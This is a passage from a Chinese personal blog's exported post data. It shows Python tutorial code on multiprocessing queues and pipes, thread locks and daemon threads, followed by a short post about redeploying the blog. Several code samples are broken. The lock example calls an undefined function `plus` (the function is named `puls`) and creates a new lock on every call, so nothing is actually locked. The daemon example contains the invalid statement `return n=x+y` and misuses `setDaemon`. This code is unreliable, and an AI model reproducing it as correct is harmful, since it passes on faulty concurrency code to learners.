<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span>(<span class="params">q,nums</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;现在的进程编号为：%s，这是一个put进程&#x27;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        q.put(num)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d已经放入队列中啦！&#x27;</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;现在的进程编号为：%s，这是一个get进程&#x27;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;已经从队列中获取%s并从中删除&#x27;</span> % q.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    p1 = Process(target=put_data,args=(q,[<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>],))</span><br><span class="line">    p2 = Process(target=put_data,args=(q,[<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>],))</span><br><span class="line">    p3 = Process(target=get_data,args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line">    p3.start()</span><br><span class="line">    p1.join()</span><br><span class="line">    p2.join()</span><br><span class="line">    <span class="comment"># p3是个死循环，需要手动结束这个进程</span></span><br><span class="line">    p3.terminate()</span><br></pre></td></tr></table></figure>

<p>我们来看一下运行结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">现在的进程编号为：10336，这是一个put进程</span><br><span class="line">1已经放入队列中啦！</span><br><span class="line">2已经放入队列中啦！</span><br><span class="line">3已经放入队列中啦！</span><br><span class="line">现在的进程编号为：9116，这是一个get进程</span><br><span class="line">已经从队列中获取1,并从中删除</span><br><span class="line">已经从队列中获取2并从中删除</span><br><span class="line">已经从队列中获取3并从中删除</span><br><span class="line">现在的进程编号为：2732，这是一个put进程</span><br><span class="line">4已经放入队列中啦！</span><br><span class="line">5已经放入队列中啦！</span><br><span class="line">已经从队列中获取4,并从中删除</span><br><span class="line">6已经放入队列中啦！</span><br><span class="line">已经从队列中获取5并从中删除</span><br><span class="line">已经从队列中获取6并从中删除</span><br></pre></td></tr></table></figure>

<h3 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h3><p>操作系统在两个进程间维持一个“管道”，这两个进程通过这条管道交换彼此的信息。这样做缺点很多，比如只能在两个进程间交换数据、容易引起阻塞等。</p>
<p>下面以 Python 中 Pipe 为例子做一个示范。Pipe 就像一根水管，两边是进程。让我们看看Pipe官方文档的描述：  </p>
<blockquote>
<p>Returns a pair (conn1, conn2) of Connection objects representing the ends of a pipe.</p>
</blockquote>
<p>Pipe 返回 conn1 和 conn2 代表水管的两端。Pipe 还有一个参数 duplex，默认为 True。当 duplex 为 True 时，开启双工模式，此时水管的两边都可以进行收发。当 duplex 为 False，那么 <strong>conn1 只负责接受信息，conn2 只负责发送信息。</strong><br>conn 通过 send() 和 recv() 来发送和接受信息。值得注意的是，如果管道中没有信息可接受，recv() 会一直阻塞直到管道关闭（任意一端进程接结束则管道关闭）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Pipe</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span>(<span class="params">p,nums</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;现在的进程编号为：%s，这个一个send进程&#x27;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        p.send(num)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s已经放入管道中啦！&#x27;</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;现在的进程编号为：%s，这个一个recv进程&#x27;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;已经从管道中获取%s并从中删除&#x27;</span> % p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pipe(duplex=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 此时Pipe[1]即是Pipe返回的conn2</span></span><br><span class="line">    p1 = Process(target=put_data,args=(p[<span class="number">1</span>],[<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>],))</span><br><span class="line">    <span class="comment"># 此时Pipe[0]即是Pipe返回的conn1</span></span><br><span class="line">    p3 = Process(target=get_data,args=(p[<span class="number">0</span>],))</span><br><span class="line">    p1.start()</span><br><span class="line">    p3.start()</span><br><span class="line">    p1.join()</span><br><span class="line">    p3.terminate()</span><br></pre></td></tr></table></figure>

<p>让我们看一下输出结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">现在的进程编号为：9868，这个一个recv进程</span><br><span class="line">现在的进程编号为：9072，这个一个send进程</span><br><span class="line">1已经放入管道中啦！</span><br><span class="line">已经从管道中获取1,并从中删除</span><br><span class="line">2已经放入管道中啦！</span><br><span class="line">已经从管道中获取2并从中删除</span><br><span class="line">3已经放入管道中啦！</span><br><span class="line">已经从管道中获取3并从中删除</span><br></pre></td></tr></table></figure>

<h2 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h2><p>多线程中任务中，可能会发生多个线程同时对一个公共资源（如全局变量）进行操作的情况，这是就会发生混乱。为了避免这种情况，需要引入线程锁的概念。只有一个线程能处于上锁状态，当一个线程上锁之后，如果有另外一个线程试图获得锁，该线程就会挂起直到拥有锁的线程将锁释放。这样就保证了同时只有一个线程对公共资源进行访问或修改。  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread,Lock</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puls</span>():</span></span><br><span class="line">    lock = Lock() <span class="comment"># 获得一个锁</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    lock.acquire() <span class="comment"># 上锁</span></span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    lock.release() <span class="comment"># 解锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t = Thread(target=plus)</span><br><span class="line">        t.start()</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>

<p>锁的好处:</p>
<ol>
<li>确保某段关键代码只能由一个线程从头到尾执行，保证了数据的唯一性。  </li>
</ol>
<p>锁的坏处:  </p>
<ol>
<li>阻止了多线程并发执行，效率大大降低。</li>
<li>由于存在多个锁，不同的线程持有不同的锁并试图获取对方的锁时，可能造成死锁。  </li>
</ol>
<h2 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h2><p>线程其实并没有主次的概念，我们一般说的‘主线程’实际上是 main 函数的线程，而所谓主线程结束子线程也会结束是因为在主线程结束时调用了系统的退出函数。而守护线程是指 <code>不重要线程</code>。主线程在所有 <code>重要</code> 线程结束后结束。通常当客户端访问服务器时会为这次访问开启一个守护线程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">n = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> n=x+y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    t = Thread(target=count,args=(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">    t.setDaemon = <span class="literal">True</span> <span class="comment"># 设为守护进程</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhihu.com/question/25532384/answer/81152571">进程和线程的区别</a></p>
<p><a href="https://blog.csdn.net/qq_32131499/article/details/94561780">写时复制</a></p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>重新开始</title>
    <url>/2017/12/02/%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<p>前阵子手贱删了博客文件，还糊里糊涂地把coding里的项目也删了。然后各种蜜汁错误，各种无法重新部署。最近几天又蜜汁部署成功。可以说十分难受了。</p>
<p><img src="%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/%E6%89%B6%E5%A2%99%E5%90%90%E8%A1%80.jpg"></p>
<p>不过塞翁失马，焉知非福。经过这么一遭我再次练习了一遍coding+hexo下博客的部署，也算是好事一桩了吧？（强行自我安慰一波233）<br>以后我一定天天向上，重新做人，再不手贱。</p>
<p><img src="%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/%E8%B7%AA%E5%9C%B0%E5%93%AD.jpg"></p>
<p>再次感谢王哥的教程，很详细，帮助很大，很好，很棒。感兴趣的同志可以去他那里转转呀（手动滑稽）<a href="http://windliang.cc/">windliang的博客</a></p>
<p>扯到这里算是暂时结束，以后有时间再上来扯扯淡，写点学习心得啥的吧。</p>
<p><img src="%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/%E6%BA%9C%E4%BA%86.jpg"></p>
]]></content>
      <categories>
        <category>日常</category>
      </categories>
      <tags>
        <tag>闲聊</tag>
      </tags>
  </entry>
</search>
